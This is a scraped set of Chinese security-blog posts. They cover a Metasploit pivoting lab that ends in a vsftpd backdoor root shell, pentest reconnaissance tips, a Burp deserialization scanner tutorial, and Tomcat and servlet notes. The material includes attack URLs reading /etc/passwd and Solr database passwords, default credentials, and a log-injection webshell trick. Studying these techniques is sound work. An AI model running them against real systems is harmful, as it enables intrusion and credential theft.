post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24[*] Running module against SRV03[*] ARP Scanning 8.8.8.0/24[*] IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)[*] IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)[*] IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)[*] IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS) ARP扫描结果显示在该网络下存在4台机器 1234567891011meterpreter &gt; run autoroute -s 8.8.8.0/24[*] Adding a route to 8.8.8.0/255.255.255.0...[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20[*] Use the -p option to list all active routesmsf &gt; route printActive Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 7.7.7.0 255.255.255.0 Session 1 8.8.8.0 255.255.255.0 Session 3 之后再次添加路由规则 两层层中转跳板在JC主机上收集信息时发现了8.8.8.0/24网络，另外之前我们就已经建立了172.16.0.0/24到7.7.7.0/24网络的路由规则。在当前的情况下，网络数据包从172.16.0.20发到JC设备(第二层中转跳板)，数据首先要发到RD设备(第一层中转跳板)，然后RD主机再将数据传送到JC主机。如果攻击者(172.16.0.20)想将数据发送到8.8.8.0/24网络(发现的第二个隐藏网络)的任何一个主机时，就得建立一个新的路由规则。为了使用Metasploit框架以外的其他工具，我们必须运行一个socks4代理服务来连接两个跳板主机，并在proxychains工具的配置文件中重新定义新的代理服务器。 攻击者机器(172.16.0.20)尝试向8.8.8.9发送网络数据包，要经过以下中转： RD：我不知道怎么访问到8.8.8.9，但我知道哪个系统能访问到它，我可以将数据发给它。 JC：我知道怎么将数据从7.7.7.0/24网络发送到8.8.8.0/24网络。 数据流如下图所示： 神器ProxychainsProxychains工具负责连接代理服务器以及端对端的传输。在最后阶段，需要为新发现的8.8.8.0/24网络在本地1081端口设置一个新的socks4代理服务。 1234567891011121314151617msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; show optionsModule options (auxiliary/server/socks4a): Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 172.16.0.20 yes The address to listen on SRVPORT 1080 yes The port to listen on.Auxiliary action: Name Description ---- ----------- Proxy msf auxiliary(socks4a) &gt; set SRVPORT 1081SRVPORT =&gt; 1081msf auxiliary(socks4a) &gt; run[*] Auxiliary module execution completed[*] Starting the socks4a proxy servermsf auxiliary(socks4a) &gt; 在/etc/proxychains.conf配置文件中添加新的代理服务器。通过激活动态链设置，确保在不同的代理服务器之间能够正常切换。 1234567root@kali:~# cat /etc/proxychains.conf | grep -v \"#\"dynamic_chainproxy_dnstcp_read_time_out 15000tcp_connect_time_out 8000socks4 172.16.0.20 1080 # First Pivotsocks4 172.16.0.20 1081 # Second Pivot Proxychains工具通过第二层跳板主机，可以对8.8.8.0/24目标网络进行nmap扫描： 123456789101112131415161718192021222324252627282930313233343536373839404142434445root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vvProxyChains-3.1 (http://proxychains.sf.net)Starting Nmap 7.25BETA1 ( https://nmap.org )Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).NSE: Loaded 36 scripts for scanning.Initiating Connect ScanScanning 8.8.8.9 [4 ports]|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OKDiscovered open port 21/tcp on 8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OKDiscovered open port 23/tcp on 8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OKDiscovered open port 22/tcp on 8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OKDiscovered open port 80/tcp on 8.8.8.9Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)Initiating Service scan at 05:54Scanning 4 services on 8.8.8.9|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OKCompleted Service scan at 05:54, 11.09s elapsed (4 services on 1 host)NSE: Script scanning 8.8.8.9.NSE: Starting runlevel 1 (of 2) scan.Initiating NSE at 05:54|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OKCompleted NSE at 05:54, 1.71s elapsedNSE: Starting runlevel 2 (of 2) scan.Initiating NSE at 05:54Completed NSE at 05:54, 0.00s elapsedNmap scan report for 8.8.8.9Host is up, received user-set (0.41s latency).ScannedPORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 2.3.422/tcp open ssh syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)23/tcp open telnet syn-ack Linux telnetd80/tcp open http syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.59 secondsroot@kali:~# 以上，数据包穿透第一层代理服务器，又经过我们定义的第二层代理服务器，最终到达目的地。对扫描结果进行分析，发现8.8.8.9上安装的vsftpd版本存在漏洞。以下步骤为在Metasploit框架中设置vsftpd利用模块进行攻击： 12345678910111213141516171819202122232425262728293031323334353637383940414243msf &gt;msf &gt; use exploit/unix/ftp/vsftpd_234_backdoormsf exploit(vsftpd_234_backdoor) &gt; show optionsModule options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 21 yes The target portExploit target: Id Name -- ---- 0 Automaticmsf exploit(vsftpd_234_backdoor) &gt; set rhost 8.8.8.9rhost =&gt; 8.8.8.9msf exploit(vsftpd_234_backdoor) &gt; run[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)[*] 8.8.8.9:21 - USER: 331 Please specify the password.[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)[*] Found shell.[*] Command shell session 4 opened (Local Pipe -&gt; Remote Pipe)pwd/iduid=0(root) gid=0(root)ifconfigeth0 Link encap:Ethernet HWaddr 08:00:27:56:f1:7c inet addr:8.8.8.9 Bcast:8.8.8.255 Mask:255.255.255.0 inet6 addr: fe80::a00:27ff:fe56:f17c/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:10843 errors:0 dropped:0 overruns:0 frame:0 TX packets:2779 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1081842 (1.0 MB) TX bytes:661455 (645.9 KB) Base address:0xd010 Memory:f0000000-f0020000lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:18161 errors:0 dropped:0 overruns:0 frame:0 TX packets:18161 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:5307479 (5.0 MB) TX bytes:5307479 (5.0 MB) 总结攻击者通过以下步骤，发现了2个不同的隐藏网络： 1.攻击者控制了RD主机，该主机和攻击机在同一个网络中 2.得知RD主机有2张网卡 3.通过使用autoroute post模块，定义一个路由规则 4.攻击者对7.7.7.0/24网络执行ARP和NMAP扫描，之后发现了命名为JC的主机 5.JC存在两个不同的漏洞，分别为MS08_067和Easy File Share应用的BOF漏洞 6.成功利用MS08_067漏洞，获取7.7.7.20访问 7.继续收集信息，发现JC也有2张网卡 8.在7.7.7.20上添加第二个路由规则 9.对8.8.8.0/24网络执行ARP和NMAP扫描 10.在命名为SK的8.8.8.9机器上发现存在漏洞的vsftp版本 11.结束 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"网络穿透","slug":"网络穿透","permalink":"https://functfan.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BF%E9%80%8F/"},{"name":"透视攻击","slug":"透视攻击","permalink":"https://functfan.github.io/tags/%E9%80%8F%E8%A7%86%E6%94%BB%E5%87%BB/"}]},{"title":"使用Burp插件Java-Deserialization-Scanner检测java反序列化漏洞","slug":"使用Burp插件Java-Deserialization-Scanner检测java反序列化漏洞","date":"2020-07-28T08:25:59.000Z","updated":"2020-07-28T08:32:01.497Z","comments":true,"path":"posts/2639883394/","link":"","permalink":"https://functfan.github.io/posts/2639883394/","excerpt":"","text":"本文内容 本文主要介绍了在java反序列化漏洞检测过程中常用的Burp插件Java-Deserialization-Scanner的使用。 插件介绍与安装插件介绍 Java反序列化扫描器是一个Burp套件插件，旨在检测和利用Java反序列化漏洞。它是由Mediaservice.net的安全顾问Federico Dotta撰写的。 这个插件由三个不同的组件组成: 1.与Burp套件集成主动式和被动式扫描器 2.Manual tester，用于检测自定义插入点上的Java反序列化漏洞 3.允许使用frohoff ysoserial积极利用Java反序列化漏洞的开发者(https://github.com/frohoff/ysoserial)) 插件安装步骤 下载 Burp Suite: http://portswigger.net/burp/download.html 使用下面的步骤从 BApp Store 下载安装Java Deserialization Scanneror: 下载最新发布的Java Deserialization Scanner（本文选择后面这种方式） 打开burp，通过Burp -&gt; Extender -&gt; Extensions -&gt; Add -&gt; Choose JavaDeserializationScannerXX.jar file 检测流程 插件作者很贴心，不仅写了个这么棒的插件，还附带了很多示例。以 sampleCommonsCollections3 为例介绍该插件的使用。 首先在 tomcat 中把 这个 war 包部署好（这个相信大家没有问题）。该插件检测反序列化漏洞就是基于一些已知库中的gadget（依赖于 ysoserial）进行检测。具体步骤如下： 1.web端启动访问 2.BURP启动监听抓包点击Serialized Java Object in body，并在burp端抓包。 抓包如下： 右键选择Send request to DS-Manual testing 选择POST数据包，按照图示顺序设置插入点，选择DNS方式查找漏洞，点击attack发起攻击 过一段时间后，在右侧窗口就会看到检测结果。 可以看到，漏洞组件为Apache Commons Collections 3,在POST数据右键选择Send to Exploitation tab 切换到Exploiting窗口，在下方红色位置输入组件名及要执行的命令，点击attack观察结果。 总结 本文主要介绍了burp下java反序列化漏洞插件Java-Deserialization-Scanner的安装与配置，并通过部署实际的案例对具体使用方法进行了介绍，以便后续需要。 参考文献 1020.Burp Suite扩展之Java-Deserialization-Scanner https://www.cnblogs.com/yh-ma/p/10299289.html Java Deserialization Scanner https://github.com/federicodotta/Java-Deserialization-Scanner document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"Java基础","slug":"Java基础","permalink":"https://functfan.github.io/tags/Java%E5%9F%BA%E7%A1%80/"},{"name":"工具利器","slug":"工具利器","permalink":"https://functfan.github.io/tags/%E5%B7%A5%E5%85%B7%E5%88%A9%E5%99%A8/"},{"name":"反序列化","slug":"反序列化","permalink":"https://functfan.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"渗透中寻找突破口的那些事（转载）","slug":"渗透中寻找突破口的那些事（转载）","date":"2020-07-28T08:24:24.000Z","updated":"2020-07-28T08:32:01.501Z","comments":true,"path":"posts/3841836989/","link":"","permalink":"https://functfan.github.io/posts/3841836989/","excerpt":"","text":"版权声明：本文为CSDN博主「hrayha」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/hrayha/article/details/104887524 注：之前发在乌云drops的一篇文章，汇总了自己对渗透测试中寻找突破口的一些总结，现在乌云drops没有了，所以发在自己blog上。 一、寻找目标 在自己日常检测中以及观察他人检测思路发现前期收集信息具有很关键的作用，很多时候不需要对某种漏洞有很深的研究，如果前期收集了足够多的目标，只需要检测一些常见的高危漏洞即可有收获 常用思路 1.网段信息 1）通过子域名 如果存在域传送这种漏洞是最好的，没有的话一般就要暴破子域名了 我常用的软件为dnsmap，基本用法 ./dnsmap target-domain.com -w 你的域名字典 -r 要保存结果文件的绝对路径，针对做了泛解析的域名可以使用-i 需忽略ip来避免误报，如对域名xxx.com的暴破过程中不存在域名都解析到1.1.1.1上，则使用命令为 ./dnsmap xxx.com -w domain.txt -i 1.1.1.1 -r /tmp/result.txt 结果为如下格式: 其中默认编译的dnsmap存在一个问题，解决方法与其他使用方法请参考 http://pan.baidu.com/s/1nt5HMw5 大家可以在默认字典的基础上加一些如oa、zabbix、nagios、cacti、erp、sap、crm等等，不少企业都是这种命名方式 渗透的话一般会从oa，mail等重要业务网段寻找目标，如果发现有些管理后台的域名为 xx.admin.xxx.com这种，则可继续扩展，寻找admin.xxx.com下的三级域名 曾检测某站时无意发现一个ntp.nb.xxx.com的域名，进而暴破nb.xxx.com这个域名，结果如下 其中zabbix.nb.xxx.com这个站点暴露到了外网，版本较低，使用zabbix的注入漏洞成功获取权限 同时子域名也可通过搜索引擎语法site:xxx.com收集(不断增加条件，可获取的更多，如inurl,intitle等等) 2）AS号 Jwhois使用方法 yum install -y jwhois安装 执行whois -h asn.shadowserver.org origin 1.1.1.1可获得ip所在企业的AS号 继续执行whois -h asn.shadowserver.org prefix as号即可获得该as号对应网段 注：一般只有大企业才会有as号，并且一个企业可能会有多个as号 3）DNS 4）spf记录 如何判断cdn？ 如果误把cdn的ip加到目标里会影响一些人工时间，如何判断cdn？最简单的方法是用多地ping功能 http://ping.chinaz.com/ 2.利用whatweb寻找web入口 使用方法 ./whatweb 1.1.1.1/24 --log-brief=output_file（详细使用参考使用说明） 默认的话只识别80端口的，如果此时我们想识别下8080端口，再加上--url-suffix=”:8080”即可 可根据title，cms等信息寻找目标，一般把后台或者存在已知漏洞的系统作为目标，同时可寻找nginx低版本存在解析漏洞的站点，受影响版本为0.5全版本，0.6全版本，0.7&lt;=0.7.65，&lt; p&gt; 0.8&lt;=0.8.37&lt; p&gt; 附上一则实例： 在检测某企业时，whatweb批量识别指纹发现存在一台nginx版本比较低且存在解析漏洞的站点，首页为空白页，对目录结构暴破发现.bash_history文件 操作历史中发现有打包文件且放在web目录下 下载打包文件，内容如下 其中发现有log文件，且log文件会记录user-agent信息 使用firefox插件User Agent Switcher更改user-agent信息 一句话代码写入log文件后利用解析漏洞直接获取webshell 3.利用nmap寻找可利用服务 详细用法参考使用手册，个人常用命令为（-P0参数视情况添加，如果没有禁ping可以不加，提升速度） ./nmap -sT -sV 1.1.1.1/24 -P0 -oN /tmp/port_result.txt --open Ip较少的情况下可以扫全端口以及一些基本信息 ./nmap -sT -sV -p 1-65535 1.1.1.1 -P0 -A 利用nmap可以发现一些非80/443/8080这种常见端口上的web以及一些容易出问题的端口如 873(rsync无验证)/21(ftp匿名账户)/11211(memcache无验证)/27017（mangodb无验证）等，碰到不认识的服务别急着放弃，去exploit-db等站点搜一下是否存在已知漏洞吧，说不准直接找到个RCE呢(很多时候我也会在乌云search一下，搜到的话就是实际例子，看着更直白) 4.利用搜索引擎寻找后台或重要系统 常用搜索语法为site:xxx.com inurl:login Inurl的值可以自由变换，常用的包括admin、manage或者使用intitle:找管理、登录之类的关键字，有些站点出来的结果可能多数为同一站点下的误报，比如博客类的，问问类的，可使用-来减少误报，比如google中搜索site:baidu.com inurl:login -zhidao就可以在结果中去除zhidao相关的结果，百度可输入site:baidu.com inurl:login -site:zhidao.baidu.com 实例参考:http://www.wooyun.org/bugs/wooyun-2010-026581 5.搞一个精简的路径字典 我们可以把容易出问题且危害比较高的常见路径做成一个精简的小字典，针对之前收集的域名去遍历，比如/invoker/JMXInvokerServlet、wwwroot.zip这种，发现的话很大几率可以搞到权限 二、利用 这里列出几个常见的系统利用方法 后台 当前面的过程中发现后台或者重要系统时，一般会进行如下几种检测 awvs综合扫描（经常有意外发现） 目录结构暴破 口令暴破（admin不行的时候，不一定是密码不对，很多时候是用户名不对，尝试想到的可获取用户名的一切方法，如翻翻js、css文件，html源码注释内容，或者.svn目录下的信息泄露等，密码可针对系统名称及域名等信息做一些变形加到字典中） Html源码、js等文件获取信息（有些开发者会把一些管理地址以注释形式放到html源码中，管理的接口地址写在js中，运气好的话可以直接越权访问） 参数值暴破（一些框架写的后台登陆页面可能是这种格式xx.com/?c=login,日常可以收集一些常见的参数值，如index、main、upload、edit、adduser等、运气好的话可以直接越权操作） axis2 文件包含： www.xxx.com/axis2/services/listServices 查看所有services www.xxx.com/axis2/services/xxxxx?xsd=../conf/axis2.xml xxxxx替换任意服务均可，读取axis2配置文件获取后台账户 www.xxx.com/axis2/axis2-admin/ 登陆管理后台 后台部署文件代码执行： 使用metasploit Resin 文件读取： http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd 也可以通过 http://www.xxx.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://1.1.1.1 实现SSRF solr敏感信息泄漏 http://xxx.org:8080/solr/admin/file/?file=solrconfig.xml 搜索xml文件，找到data-import.xml 访问 http://xxx.org:8080/solr/admin/file/?file=data-import.xml 获取数据库密码 Hudson（jenkins类似） 参考http://www.wooyun.org/bugs/wooyun-2010-018339 Zenoss Google关键字：intitle:\"Zenoss Login\" 默认口令admin/zenoss 利用方法参考http://www.wooyun.org/bugs/wooyun-2010-019917 Zabbix 后台:http://www.xxx.com/zabbix 默认密码:admin/zabbix Google:inurl:zabbix/dashboard.php 利用方法参考http://www.wooyun.org/bugs/wooyun-2013-036277 另外这个zabbix注入的也很多都存在http://drops.wooyun.org/papers/680 Cacti 默认登陆路径www.xxx.com/cacti/index.php 默认密码admin/admin 利用方法参考http://www.wooyun.org/bugs/wooyun-2010-02674 Splunk 默认后台地址: http://xxx.com:8000/zh-CN/account/login?return_to=%2Fzh-CN%2F 默认账户admin/changeme 默认端口8000 管理器-应用-从文件安装应用处可获得shell msf有利用模块 exploit/multi/http/splunk_upload_app_exec 结尾 推荐两篇乌云综合性介绍文章 1.从乌云看运维安全那点事儿 http://drops.wooyun.org/papers/410 2.攻击JavaWeb应用[7]-Server篇[1] http://drops.wooyun.org/tips/604 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://functfan.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"思想结晶","slug":"思想结晶","permalink":"https://functfan.github.io/tags/%E6%80%9D%E6%83%B3%E7%BB%93%E6%99%B6/"},{"name":"突破口","slug":"突破口","permalink":"https://functfan.github.io/tags/%E7%AA%81%E7%A0%B4%E5%8F%A3/"}]},{"title":"如何在IDEA环境中调试Tomcat源代码","slug":"如何在IDEA环境中调试Tomcat源代码","date":"2020-07-28T08:22:47.000Z","updated":"2020-07-28T08:32:01.501Z","comments":true,"path":"posts/4044431530/","link":"","permalink":"https://functfan.github.io/posts/4044431530/","excerpt":"","text":"准备IDEA与Tomcat 1.IDEA在我看来是目前我用过的最舒服的（没有之一）的编译器，去哪下载，怎么安装我在这就不多做阐述了，请自行登梯下载部署配置。 2.tomcat源码下载的时候选择：apache-tomcat-***-src.zip，以8.5.47版本为例，则下载对应的文件名为：apache-tomcat-8.5.47-src.zip。 这两部分内容涉及不到任何技术细节，因此不具体提供方法，对我来说这两部分都不是问题，相信大家应该也不成问题。 调试步骤具体调试方法如下： 下载解压，在其根目录下新建catalina-home文件夹和pom.xml文件，如下图所示。 把根目录下的conf和webapps复制到catalina-home文件下，其他目录新建即可。 修改第一步新建pom.xml文件，具体内容如下（涉及到版本问题的请自行修改即可）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;Tomcat8.5.47&lt;/artifactId&gt; &lt;name&gt;Tomcat8.5.47&lt;/name&gt; &lt;version&gt;8.5.47&lt;/version&gt; &lt;build&gt; &lt;finalName&gt;Tomcat8.5.47&lt;/finalName&gt; &lt;sourceDirectory&gt;java&lt;/sourceDirectory&gt; &lt;testSourceDirectory&gt;test&lt;/testSourceDirectory&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;java&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;directory&gt;test&lt;/directory&gt; &lt;/testResource&gt; &lt;/testResources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.easymock&lt;/groupId&gt; &lt;artifactId&gt;easymock&lt;/artifactId&gt; &lt;version&gt;3.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;ant&lt;/groupId&gt; &lt;artifactId&gt;ant&lt;/artifactId&gt; &lt;version&gt;1.7.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;wsdl4j&lt;/groupId&gt; &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt; &lt;version&gt;1.6.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.xml&lt;/groupId&gt; &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt; &lt;artifactId&gt;ecj&lt;/artifactId&gt; &lt;version&gt;4.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 运行idea导入tomcat源码 配置tomcat运行环境，以启动tomcat服务器：Main class：Bootstrap（org.apache.catalina.startup）VM options: -Dcatalina.home=”你的路径/apache-tomcat-8.5.47-src/catalina-home”// -D 是java设置参数的固定写法// catalina.home 是参数名// =的后面是tomcat源码项目的catalina-home的路径，当这个路径包含空格是需要使用”” 编译时，Test模块下的TestCookieFilter.java会报错，注释掉这个类即可 7.在ContextConfig.java中的webConfig();代码语句后添加代码： 1context.addServletContainerInitializer(new JasperInitializer(),null); ContextConfig.java和Bootstrap主类在同一处，见步骤58.运行项目，启动成功，访问正常。 导入Tomcat9需修改的点 ResponseTrailers 找不到，把 home\\webapps\\examples\\WEB-INF\\classes\\trailers 目录拷贝到 test 目录下 CookieFilter 找不到，把 home\\webapps\\examples\\WEB-INF\\classes\\util\\CookieFilter.java 文件拷贝到 test\\util 目录下 编辑 org.apache.catalina.startup.ContextConfig 文件的 configureStart() 方法，添加初始化 JSP 解析器的代码：1context.addServletContainerInitializer(new JasperInitializer(), null); 开启挖掘漏洞之旅 以上步骤完成之后就可以大展宏图挖漏洞了，不过能不能挖出来还要看技术功底了，不过你可以靠多练习，经过对历史漏洞的研究，相信不就得将来是可以拿到属于自己的CVE的！加油！ 参考文献 IDEA 导入 Tomcat9 源码 https://blog.csdn.net/weixin_30631587/article/details/96528373 idea中导入tomcat源码并运行 https://www.tqwba.com/x_d/jishu/6220.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/categories/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"技术基础","slug":"技术基础","permalink":"https://functfan.github.io/tags/%E6%8A%80%E6%9C%AF%E5%9F%BA%E7%A1%80/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://functfan.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"环境部署","slug":"环境部署","permalink":"https://functfan.github.io/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"},{"name":"源代码审计","slug":"源代码审计","permalink":"https://functfan.github.io/tags/%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"必须知道的requestURI、servletPath、contextPath（转载）","slug":"必须知道的requestURI、servletPath、contextPath（转载）","date":"2020-07-28T08:21:08.000Z","updated":"2020-07-28T08:32:01.501Z","comments":true,"path":"posts/558851770/","link":"","permalink":"https://functfan.github.io/posts/558851770/","excerpt":"","text":"版权声明：本文为CSDN博主「十二翼堕落天使」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/XY1790026787/article/details/105735272 一、requestURI、servletPath、contextPath 假设： 当前的项目根目录为：/demo，即访问首页的路径为http://localhost:8080/demo/index.jsp。 页面全部位于 web 根目录下。 假设有一个 Servlet： public class TestServlet extends HttpServlet { @Override protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { super.service(request, response); System.out.println(\"context-path=\" + request.getContextPath()); System.out.println(\"servlet-path=\" + request.getServletPath()); System.out.println(\"request-uri=\" + request.getRequestURI()); } } 那么访问首页 http://localhost:8080/demo/index.jsp则会输出： context-path=/demo servlet-path=/index.jsp request-uri=/demo/index.jsp 二、转发、重定向的参数 假设当前 Servlet 正在处理的请求的请求路径为/demo/control/login。 带/转发 假设转发的方式为： request.getRequestDispatcher(\"/home.jsp\").forward(request, response); 那么转发到的路径为： http://localhost:8080/demo/home.jsp 相对 web 根目录转发。符合期望。 不带/转发 假设转发的方式为： request.getRequestDispatcher(\"home.jsp\").forward(request, response); 那么转发到的路径为： http://localhost:8080/demo/control/home.jsp 相对当前请求路径转发。不符合期望。 带/重定向 假设重定向的方式为： response.sendRedirect(\"/login.jsp\"); 那么重定向的路径为： http://localhost:8080/login.jsp 相对项目路径（或 context-path）重定向。不符合期望。 